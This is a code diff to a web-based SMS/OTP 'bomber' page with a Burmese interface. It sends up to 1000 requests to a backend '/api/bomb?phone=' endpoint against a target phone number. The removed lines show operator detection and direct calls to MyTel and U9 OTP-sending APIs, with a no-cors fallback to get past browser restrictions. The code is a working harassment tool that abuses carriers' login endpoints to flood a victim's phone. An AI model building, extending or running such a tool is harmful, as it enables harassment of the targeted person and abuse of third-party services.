@@ -590,7 +590,7 @@ body.running .stat-box{border-color:rgba(56,189,248,.4)}
       </div>
       <div class="input-group" id="delayGroup">
         <label for="delayInput">Interval (စက္ကန့်)</label>
-        <input type="number" id="delayInput" class="input-field" value="1.0" step="0.1" min="0">
+        <input type="number" id="delayInput" class="input-field" value="3.0" step="0.1" min="3">
       </div>
     </div>
   </div>
@@ -834,6 +834,17 @@ function setOperator(op) {
   document.querySelectorAll('.pill-btn').forEach(b => {
     b.classList.toggle('active', b.dataset.op === op);
   });
+  
+  // Wave ကို ရွေးရင် အနည်းဆုံး ၃ စက္ကန့် သတ်မှတ်မယ်
+  const delayInput = document.getElementById('delayInput');
+  if (op === 'wave') {
+    delayInput.min = "3";
+    if (parseFloat(delayInput.value) < 3) {
+      delayInput.value = "3.0";
+    }
+  } else {
+    delayInput.min = "0";
+  }
 }
 
 function bump(el) {
@@ -928,29 +939,6 @@ function tickEta() {
 }
 
 function normalizePhone(raw) { return String(raw).replace(/[^\d+]/g, '').replace(/^\+/, ''); }
-function detectOp(phone) {
-  let c = normalizePhone(phone);
-  if (c.startsWith('95')) c = '0' + c.slice(2);
-  if (c.length === 9) c = '0' + c;
-  
-  // MYTEL
-  if (c.startsWith('0966') || c.startsWith('0967') || c.startsWith('0968') || c.startsWith('0969')) return 'mytel';
-  // U9
-  if (c.startsWith('0995') || c.startsWith('0996') || c.startsWith('0997') || c.startsWith('0998') || c.startsWith('0999')) return 'u9';
-  // ATOM
-  if (c.startsWith('0975') || c.startsWith('0976') || c.startsWith('0977') || c.startsWith('0978') || c.startsWith('0979')) return 'atom';
-  // MPT
-  if (['0925', '0926', '0940', '0941', '0942', '0943', '0944', '0945'].some(p => c.startsWith(p))) return 'mpt';
-  if (['0950', '0951', '0952', '0953', '0954', '0955', '0956'].some(p => c.startsWith(p))) return 'mpt';
-  if (['0988', '0920', '0973', '0991'].some(p => c.startsWith(p))) return 'mpt';
-  
-  // Fallback
-  if (c.startsWith('096')) return 'mytel';
-  if (c.startsWith('099')) return 'u9';
-  if (c.startsWith('097')) return 'atom';
-  if (c.startsWith('092') || c.startsWith('094') || c.startsWith('095') || c.startsWith('098')) return 'mpt';
-  return 'unknown';
-}
 
 function validate() {
   const p = document.getElementById('phoneInput');
@@ -965,26 +953,17 @@ function validate() {
   const count = parseInt(c.value, 10);
   if (!Number.isFinite(count) || count < 1 || count > 1000) { c.classList.add('invalid'); return { err: 'Iterations ကို 1 မှ 1000 အတွင်း ထည့်ပါ။' }; }
   
-  const delay = parseFloat(d.value);
-  if (!Number.isFinite(delay) || delay < 0) { d.classList.add('invalid'); return { err: 'Interval ကို 0 သို့မဟုတ် အထက် ထည့်ပါ။' }; }
+  let delay = parseFloat(d.value);
   
-  const actualOp = detectOp(phone);
-  if (actualOp === 'unknown') {
-    return { err: 'ဖုန်းနံပါတ်ပုံစံကို မမှတ်မိနိုင်ပါ။' };
+  // WAVE DELAY LOCK (အနည်းဆုံး ၃ စက္ကန့်)
+  if (currentOp === 'wave' && delay < 3) {
+    d.classList.add('invalid');
+    return { err: 'Wave အတွက် Interval ကို အနည်းဆုံး ၃ စက္ကန့် ထားရပါမည်။' };
   }
 
-  if (actualOp === 'atom') {
-    return { err: 'ATOM Api မချိတ်ဆက်ရသေးပါ ။' };
-  }
-  if (actualOp === 'mpt') {
-    return { err: 'MPT Api မချိတ်ဆက်ရသေးပါ ။' };
-  }
+  if (!Number.isFinite(delay) || delay < 0) { d.classList.add('invalid'); return { err: 'Interval ကို 0 သို့မဟုတ် အထက် ထည့်ပါ။' }; }
 
-  if (currentOp !== 'auto' && currentOp !== actualOp) {
-    return { err: `Operator မှားယွင်းနေပါသည်။ ဖုန်းနံပါတ်သည် ${actualOp.toUpperCase()} ဖြစ်ပါသည်။` };
-  }
-
-  return { phone, count, delay };
+  return { phone, count, delay, op: currentOp };
 }
 
 function startAutomation(event) {
@@ -1007,8 +986,7 @@ function startAutomation(event) {
   isRunning = true;
   updateUI(true);
 
-  const op = currentOp === 'auto' ? detectOp(v.phone) : currentOp;
-  logMsg(`Sequence စတင်နေပါပြီ [${op.toUpperCase()}] → ${v.phone}`, 'sys');
+  logMsg(`Sequence စတင်နေပါပြီ [${v.op.toUpperCase()}] → ${v.phone}`, 'sys');
 
   let currentIdx = 1;
 
@@ -1016,54 +994,27 @@ function startAutomation(event) {
     if (!isRunning || currentIdx > v.count) return;
     
     const i = currentIdx;
-    const actualOp = currentOp === 'auto' ? detectOp(v.phone) : currentOp;
     
-    logMsg(`Node #${i} | ${actualOp.toUpperCase()} | ပို့ဆောင်နေပါသည်...`, 'info', i);
+    logMsg(`Node #${i} | ပို့ဆောင်နေပါသည်...`, 'info', i);
     
     let resObj = { success: false };
     
     try {
-      if (actualOp === 'wave') {
-        // ==========================================
-        // WAVE API VIA RAILWAY BACKEND (With Timeout)
-        // ==========================================
-        const controller = new AbortController();
-        const reqTimeout = setTimeout(() => controller.abort(), 15000); // 15 စက္ကန့် စောင့်မယ်
+      // WAVE API VIA RAILWAY BACKEND
+      const controller = new AbortController();
+      const reqTimeout = setTimeout(() => controller.abort(), 15000);
 
-        const res = await fetch(`${BACKEND_URL}/api/bomb?phone=${encodeURIComponent(v.phone)}`, {
-          signal: controller.signal
-        });
-        clearTimeout(reqTimeout);
-        
-        const data = await res.json();
-        
-        if (data.status === 'success') {
-          resObj.success = true;
-        } else {
-          resObj.success = false;
-        }
+      const res = await fetch(`${BACKEND_URL}/api/bomb?phone=${encodeURIComponent(v.phone)}`, {
+        signal: controller.signal
+      });
+      clearTimeout(reqTimeout);
+      
+      const data = await res.json();
+      
+      if (data.status === 'success') {
+        resObj.success = true;
       } else {
-        // MYTEL / U9 (Direct)
-        let url, init;
-        if (actualOp === 'mytel') {
-          url = 'https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=' + encodeURIComponent(v.phone);
-          init = { method: 'GET', cache: 'no-store' };
-        } else {
-          url = 'https://ecareappga.u9.com.mm/u9selfcareapi12.0/api/Authentication/SendOTP';
-          init = { method: 'POST', cache: 'no-store', body: JSON.stringify({ phoneNumber: v.phone }), headers: { 'Content-Type': 'application/json' } };
-        }
-        
-        try {
-          const res = await fetch(url, Object.assign({}, init, { mode: 'cors' }));
-          if (res.status >= 200 && res.status < 300) resObj.success = true;
-        } catch (e) {
-          try {
-            await fetch(url, Object.assign({}, init, { mode: 'no-cors' }));
-            resObj.success = true;
-          } catch (e2) {
-            resObj.success = false;
-          }
-        }
+        resObj.success = false;
       }
     } catch (e) {
       resObj.success = false;
@@ -1076,13 +1027,13 @@ function startAutomation(event) {
       const el = document.getElementById('successCount');
       animateNumber(el, success - 1, success);
       bump(el);
-      logMsg(`Node #${i} | ${actualOp.toUpperCase()} | အောင်မြင်ပါသည် ✅`, 'success', i);
+      logMsg(`Node #${i} | အောင်မြင်ပါသည် ✅`, 'success', i);
     } else {
       fail++; dispatched++;
       const el = document.getElementById('failCount');
       animateNumber(el, fail - 1, fail);
       bump(el);
-      logMsg(`Node #${i} | ${actualOp.toUpperCase()} | Proxy ကျသွားပါသည် ⚠️`, 'error', i);
+      logMsg(`Node #${i} | Proxy ကျသွားပါသည် ⚠️`, 'error', i);
     }
     
     updateProgress(); tickEta();
